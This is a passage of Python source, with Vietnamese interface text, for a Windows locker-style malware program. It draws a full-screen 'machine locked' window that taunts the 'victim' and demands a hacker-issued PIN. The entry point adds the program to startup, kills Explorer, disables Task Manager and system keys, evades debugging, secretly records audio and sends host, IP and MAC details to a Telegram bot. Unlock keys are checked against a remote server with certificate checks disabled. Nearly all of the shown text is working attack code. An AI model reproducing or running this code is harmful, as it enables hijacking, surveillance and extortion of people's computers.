        ext = ".jpg" if b"JFIF" in raw[:100] else ".png"
        path = os.path.join(temp_dir, f"wp_{random.randint(100000,999999)}{ext}")

        with open(path, "wb") as f:
            f.write(raw)

        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    except:
        pass

def get_system_info():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        mac = ':'.join(('%012X' % uuid.getnode())[i:i+2] for i in range(0,12,2))
        osver = f"{platform.system()} {platform.release()}"
        return f"HOST: {hostname}\nIP: {ip}\nMAC: {mac}\nOS: {osver}\nID riêng: {unique_id}"
    except:
        return f"SYSTEM INFO: HIDDEN\nID riêng: {unique_id}"

# ================== GIAO DIỆN ==================

class MatrixRainWidget(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.drops = []
        self.chars = "01"
        self.font_size = 14
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_rain)
        self.timer.start(40)
        self.setAttribute(Qt.WidgetAttribute.WA_TransparentForMouseEvents)

    def resizeEvent(self, event):
        self.columns = int(self.width() / self.font_size)
        self.drops = []
        for i in range(self.columns):
            length = random.randint(5, 25)
            x = i * self.font_size
            y = random.randint(-self.height(), 0)
            speed = random.randint(3, 8)
            text_content = [random.choice(self.chars) for _ in range(length)]
            self.drops.append({"x": x, "y": y, "speed": speed, "text": text_content, "h": length * 18})
        super().resizeEvent(event)

    def update_rain(self):
        for drop in self.drops:
            drop["y"] += drop["speed"]
            if drop["y"] > self.height():
                drop["y"] = -drop["h"] - random.randint(50, 150)
        self.update()

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setFont(QFont(FONT_FAMILY, self.font_size, QFont.Weight.Bold))
        
        for drop in self.drops:
            for i, char in enumerate(drop["text"]):
                y_pos = int(drop["y"] + i * 18)
                if 0 <= y_pos <= self.height():
                    color = QColor("#00FF00")
                    if i == len(drop["text"]) - 1:
                         color = QColor("#CCFFCC")
                    elif random.random() > 0.9:
                         color = QColor("#008800")
                    
                    painter.setPen(color)
                    painter.drawText(drop["x"], y_pos, char)

class ScrollingLabel(QLabel):
    def __init__(self, text, parent=None):
        super().__init__(text, parent)
        self.setFont(QFont(FONT_FAMILY, 20, QFont.Weight.Bold))
        self.setStyleSheet("color: red; background: transparent;")
        self.adjustSize()
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.animate)
        self.timer.start(30)
        self.x_pos = 0

    def showEvent(self, event):
        if self.parent():
            self.x_pos = self.parent().width()
            self.move(self.x_pos, self.y())
        super().showEvent(event)

    def animate(self):
        self.x_pos -= 5
        if self.x_pos < -self.width():
            if self.parent():
                self.x_pos = self.parent().width()
        self.move(self.x_pos, self.y())

class MiniChat(QFrame):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setStyleSheet("background-color: black; border: 1px solid #00FF00; border-radius: 5px;")
        self.setFixedHeight(180)
        
        layout = QVBoxLayout(self)
        layout.setContentsMargins(5, 5, 5, 5)
        layout.setSpacing(5)
        
        self.chat_display = QTextEdit()
        self.chat_display.setReadOnly(True)
        self.chat_display.setStyleSheet("color: #00FF00; background-color: #111; border: none; font-family: Courier New; font-size: 12px;")
        layout.addWidget(self.chat_display)
        
        input_layout = QHBoxLayout()
        self.msg_input = QLineEdit()
        self.msg_input.setPlaceholderText("Nhắn tin cho hacker để được trợ giúp")
        self.msg_input.setStyleSheet("color: #00FF00; background-color: #222; border: 1px solid #005500; padding: 3px;")
        self.msg_input.returnPressed.connect(self.send_msg)
        
        self.send_btn = QPushButton("GỬI")
        self.send_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.send_btn.setStyleSheet("color: black; background-color: #00FF00; font-weight: bold; border: none; padding: 3px 10px;")
        self.send_btn.clicked.connect(self.send_msg)
        
        input_layout.addWidget(self.msg_input)
        input_layout.addWidget(self.send_btn)
        layout.addLayout(input_layout)
        
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.check_incoming)
        self.timer.start(500)

    def send_msg(self):
        txt = self.msg_input.text().strip()
        if txt:
            self.append_chat(f"nạn nhân: {txt}")
            chat_queue_out.put(txt)
            self.msg_input.clear()

    def check_incoming(self):
        try:
            while not chat_queue_in.empty():
                msg = chat_queue_in.get_nowait()
                self.append_chat(f"HACKERLML: {msg}")
        except:
            pass

    def append_chat(self, text):
        self.chat_display.append(text)
        sb = self.chat_display.verticalScrollBar()
        sb.setValue(sb.maximum())

class LockScreen(QWidget):
    def __init__(self):
        super().__init__()
        self.allow_close = False
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint |
                            Qt.WindowType.WindowStaysOnTopHint |
                            Qt.WindowType.Tool)
        self.setStyleSheet(f"background-color: {BG_COLOR};")

        self.matrix_rain = MatrixRainWidget(self)
        self.matrix_rain.setGeometry(self.rect())

        main_layout = QVBoxLayout(self)
        main_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.frame = QFrame()
        self.frame.setStyleSheet(f"background-color: black; border: 2px solid {FG_COLOR}; border-radius: 10px;")
        self.frame.setFixedWidth(650)

        frame_layout = QVBoxLayout(self.frame)
        frame_layout.setContentsMargins(30, 30, 30, 30)
        frame_layout.setSpacing(15)

        self.title_content = "[ MÁY BỊ KHÓA ]"
        self.title_label = QLabel(self.title_content)
        self.title_label.setFont(QFont(FONT_FAMILY, 30, QFont.Weight.Bold))
        self.title_label.setStyleSheet("border: none; background: transparent;")
        self.title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        frame_layout.addWidget(self.title_label)

        self.subtitle_label = QLabel("HACKER LML ĐÃ CHIẾM QUYỀN KIỂM SOÁT MÁY TÍNH CỦA BẠN")
        self.subtitle_label.setFont(QFont(FONT_FAMILY, 12))
        self.subtitle_label.setStyleSheet(f"color: {FG_COLOR}; border: none; background: transparent;")
        self.subtitle_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.subtitle_label.setWordWrap(True)
        frame_layout.addWidget(self.subtitle_label)

        self.info_label = QLabel(get_system_info())
        self.info_label.setFont(QFont(FONT_FAMILY, 10))
        self.info_label.setStyleSheet("color: #008800; border: none; background: transparent;")
        self.info_label.setAlignment(Qt.AlignmentFlag.AlignLeft)
        frame_layout.addWidget(self.info_label)

        sep = QLabel("-" * 40)
        sep.setStyleSheet(f"color: {FG_COLOR}; border: none; background: transparent;")
        sep.setAlignment(Qt.AlignmentFlag.AlignCenter)
        frame_layout.addWidget(sep)

        self.prompt_label = QLabel("NHẬP MÃ PIN HACKER CẤP:")
        self.prompt_label.setFont(QFont(FONT_FAMILY, 14, QFont.Weight.Bold))
        self.prompt_label.setStyleSheet("color: white; border: none; background: transparent;")
        self.prompt_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        frame_layout.addWidget(self.prompt_label)

        self.pin_entry = QLineEdit()
        self.pin_entry.setFont(QFont(FONT_FAMILY, 24, QFont.Weight.Bold))
        self.pin_entry.setStyleSheet(f"color: {FG_COLOR}; background-color: black; border: 1px solid {FG_COLOR}; padding: 5px;")
        self.pin_entry.setEchoMode(QLineEdit.EchoMode.Password)
        self.pin_entry.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.pin_entry.returnPressed.connect(self.check_pin)
        frame_layout.addWidget(self.pin_entry)

        btn_grid = QGridLayout()
        btn_grid.setSpacing(10)
        buttons = [
            ('1',0,0), ('2',0,1), ('3',0,2),
            ('4',1,0), ('5',1,1), ('6',1,2),
            ('7',2,0), ('8',2,1), ('9',2,2),
            ('C',3,0), ('0',3,1), ('OK',3,2),
        ]

        self.btn_widgets = []
        for text, r, c in buttons:
            btn = QPushButton(text)
            btn.setFont(QFont(FONT_FAMILY, 14, QFont.Weight.Bold))
            btn.setFixedSize(70, 50)
            btn.setCursor(Qt.CursorShape.PointingHandCursor)

            base_style = "background-color: black; border-radius: 5px;"
            if text == 'C':
                btn.setStyleSheet(base_style + "color: red; border: 1px solid red;")
                btn.clicked.connect(self.clear_entry)
            elif text == 'OK':
                btn.setStyleSheet(base_style + f"color: {FG_COLOR}; border: 1px solid {FG_COLOR};")
                btn.clicked.connect(self.check_pin)
            else:
                btn.setStyleSheet(base_style + f"color: {FG_COLOR}; border: 1px solid {FG_COLOR};")
                btn.clicked.connect(lambda _, t=text: self.add_digit(t))

            btn_grid.addWidget(btn, r, c)
            self.btn_widgets.append(btn)

        btn_container = QWidget()
        btn_container.setLayout(btn_grid)
        btn_container.setStyleSheet("background: transparent;")
        frame_layout.addWidget(btn_container, 0, Qt.AlignmentFlag.AlignCenter)

        self.status_label = QLabel("ĐANG CHỜ HÀNH ĐỘNG")
        self.status_label.setFont(QFont(FONT_FAMILY, 10))
        self.status_label.setStyleSheet("color: yellow; border: none; background: transparent;")
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        frame_layout.addWidget(self.status_label)

        main_layout.addWidget(self.frame)

        marquee_text = "HACKER LML ĐÃ CHIẾM QUYỀN KIỂM SOÁT MÁY TÍNH CỦA BẠN" * 3
        self.marquee_top = ScrollingLabel(marquee_text, self)
        self.marquee_top.move(0, 10)

        self.marquee_bottom = ScrollingLabel(marquee_text, self)

        # Chat nằm góc phải trên
        self.mini_chat = MiniChat(self)
        self.mini_chat.setFixedWidth(300)
        self.mini_chat.show()

        self.showFullScreen()

        self.title_blink_pos = 0
        self.blink_timer = QTimer(self)
        self.blink_timer.timeout.connect(self.blink_title)
        self.blink_timer.start(100)

        self.wave_offset = 0
        self.wave_timer = QTimer(self)
        self.wave_timer.timeout.connect(self.update_wave_subtitle)
        self.wave_timer.start(50)

        # Hotkey thoát ẩn: Ctrl + K + N
        self.ctrl_pressed = False
        self.k_pressed = False
        self.n_pressed = False
        keyboard.on_press(self.on_key_press)
        keyboard.on_release(self.on_key_release)

    def on_key_press(self, event):
        if event.name == 'ctrl':
            self.ctrl_pressed = True
        elif event.name == 'k':
            self.k_pressed = True
        elif event.name == 'n':
            self.n_pressed = True
        self.check_exit_hotkey()

    def on_key_release(self, event):
        if event.name == 'ctrl':
            self.ctrl_pressed = False
        elif event.name == 'k':
            self.k_pressed = False
        elif event.name == 'n':
            self.n_pressed = False

    def check_exit_hotkey(self):
        if self.ctrl_pressed and self.k_pressed and self.n_pressed:
            self.allow_close = True
            self.close()

    def blink_title(self):
        new_text = ""
        for i, char in enumerate(self.title_content):
            if i == self.title_blink_pos:
                new_text += f"<font color='white'>{char}</font>"
            else:
                new_text += f"<font color='red'>{char}</font>"
        self.title_label.setText(new_text)
        self.title_blink_pos = (self.title_blink_pos + 1) % len(self.title_content)

    def update_wave_subtitle(self):
        text = "HACKER LML ĐÃ CHIẾM QUYỀN KIỂM SOÁT MÁY TÍNH CỦA BẠN"
        formatted = ""
        for i, char in enumerate(text):
            if char == " ":
                formatted += " "
                continue
            hue = (self.wave_offset + (i * 10)) % 360
            color = QColor.fromHsv(hue, 255, 255)
            formatted += f'<font color="{color.name()}">{char}</font>'
        self.subtitle_label.setText(formatted)
        self.wave_offset = (self.wave_offset + 10) % 360

    def resizeEvent(self, event):
        self.matrix_rain.setGeometry(self.rect())
        if hasattr(self, 'marquee_bottom'):
            self.marquee_bottom.move(0, self.height() - 50)
        if hasattr(self, 'mini_chat'):
            self.mini_chat.move(self.width() - self.mini_chat.width() - 20, 60)
        super().resizeEvent(event)

    def add_digit(self, digit):
        if not is_locked_out:
            self.pin_entry.setText(self.pin_entry.text() + digit)

    def clear_entry(self):
        if not is_locked_out:
            self.pin_entry.clear()

    def check_pin(self):
        global failed_attempts, is_locked_out
        if is_locked_out:
            return

        entered = self.pin_entry.text().strip()

        # Kiểm tra key từ server JSON
        raw = None
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(JSON_URL, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=10, context=ctx) as response:
                raw = response.read()
        except: 
            pass

        is_valid = False
        if entered == str(device_key):
            is_valid = True

        if raw:
            try:
                data = json.loads(raw.decode('utf-8', errors='ignore'))
                if isinstance(data, dict) and unique_id in data:
                    server_key = str(data[unique_id]).strip()
                    if entered == server_key:
                        is_valid = True
            except Exception as e:
                print("Lỗi parse JSON key:", e)

        if is_valid:
            # Khôi phục các chức năng
            if anti_shutdown:
                anti_shutdown.restore_defaults()
            remove_from_startup()
            toggle_task_manager(disable=False)
            unblock_system_keys()
            change_wallpaper_from_url(REAL_WALLPAPER_URL)
            stop_and_send_audio()
            start_explorer()
            
            self.status_label.setText("MẬT KHẨU ĐÚNG! ĐANG MỞ KHÓA...")
            self.status_label.setStyleSheet("color: #00FF00; border: none; background: transparent;")
            QApplication.processEvents()
            
            self.allow_close = True
            QApplication.quit()
        else:
            failed_attempts += 1
            self.pin_entry.clear()
            if failed_attempts >= MAX_ATTEMPTS:
                is_locked_out = True
                self.pin_entry.setEnabled(False)
                for b in self.btn_widgets:
                    b.setEnabled(False)
                self.lockout_val = LOCKOUT_DURATION
                self.lock_timer = QTimer(self)
                self.lock_timer.timeout.connect(self.update_lockout)
                self.lock_timer.start(1000)
                self.update_lockout()
            else:
                rem = MAX_ATTEMPTS - failed_attempts
                self.status_label.setText(f"[!] SAI MÃ PIN (CÒN {rem} LẦN)")
                self.status_label.setStyleSheet("color: red; border: none; background: transparent;")

    def update_lockout(self):
        if self.lockout_val > 0:
            m, s = divmod(self.lockout_val, 60)
            self.status_label.setText(f"HỆ THỐNG TẠM KHÓA: {m:02d}:{s:02d}")
            self.status_label.setStyleSheet("color: red; border: none; background: transparent;")
            self.lockout_val -= 1
        else:
            global failed_attempts, is_locked_out
            self.lock_timer.stop()
            is_locked_out = False
            failed_attempts = 0
            self.pin_entry.setEnabled(True)
            self.pin_entry.setFocus()
            for b in self.btn_widgets:
                b.setEnabled(True)
            self.status_label.setText("HÃY NHẬP LẠI MÃ PIN")
            self.status_label.setStyleSheet("color: yellow; border: none; background: transparent;")

    def closeEvent(self, event):
        if not self.allow_close:
            event.ignore()
        else:
            if anti_shutdown:
                anti_shutdown.restore_defaults()
            remove_from_startup()
            toggle_task_manager(disable=False)
            unblock_system_keys()
            stop_and_send_audio()
            start_explorer()
            event.accept()

# ================== ENTRY POINT ==================

if __name__ == "__main__":
    anti_debug()
    anti_pythonpath()

    # Thêm vào startup để chạy cùng Windows
    add_to_startup()
    
    # Tắt Explorer để khóa màn hình ngay lập tức
    kill_explorer()
    
    # Khởi tạo AntiShutdownManager
    anti_shutdown = AntiShutdownManager()
    
    toggle_task_manager(disable=True)
    block_system_keys()

    # Bắt đầu ghi âm
    audio_recorder.start()

    if sys.platform == "win32":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    # GỬI INFO VỀ TELEGRAM
    if BOT_TOKEN and ADMIN_IDS:
        threading.Thread(target=run_bot_and_send_info, daemon=True).start()

    app = QApplication(sys.argv)
    window = LockScreen()
    window.show()
    app.aboutToQuit.connect(stop_and_send_audio)
    sys.exit(app.exec())